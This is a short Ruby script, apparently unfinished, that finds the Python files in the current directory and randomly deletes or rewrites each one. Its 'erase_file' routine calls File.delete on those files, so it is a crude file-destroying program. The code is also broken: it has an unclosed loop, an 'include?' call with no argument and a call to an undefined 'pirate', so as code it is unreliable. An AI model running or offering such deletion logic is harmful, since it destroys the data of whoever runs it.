def check_files
  @all_files = []
  Dir.foreach(Dir.getwd) do |name|
  @all_files << name
  end
end

def check_name
  check_files
  @py_files = []
  pos = 0
  while pos < @all_files.size
    if @all_files[pos].include?(".py")
      @py_files << pos
    end
    pos += 1
  end
end

def destiny_chooser
  @pos = 0
  @all_files[@py_files[@pos]]
  while @pos < @py_files.size
    destiny = Random.rand(1..2)
    if destiny == 1
      puts "erase"
      erase_file
      @pos += 1
    else
      puts "change"
      change_file
      @pos += 1
    end
  end
end

#def change_file
#  File.open(@all_files[@py_files[@pos]], "w") do |file|
#    file.write("Safe")
#  end
#end


def erase_file
  File.delete(@all_files[@py_files[@pos]])
end

def change_file
  lines = []
  file = File.open(@all_files[@py_files[@pos]], "r")
  file.readlines.each do |line|
    line.split('').each do |line|
      lines << line
    end
  end
  char = 0
  while char < lines.length
    if lines[char].include?
  end
  p lines
end

check_name
pirate
#destiny_chooser

